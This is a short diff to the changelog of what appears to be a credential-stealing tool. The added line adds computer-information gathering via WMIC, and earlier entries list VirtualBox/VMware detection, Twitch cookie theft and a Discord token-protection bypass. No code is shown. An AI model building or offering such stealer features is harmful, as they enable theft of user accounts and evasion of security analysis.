@@ -84,6 +84,7 @@
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.6.8 Get a lot information about the computer (using WMIC)
 - V4.6.7 Detect VMBox and VMWare
 - V4.6.6 Added Cookie Twitch Support !
 - V4.6.5 Added Better Discord and Token Protector Bypass
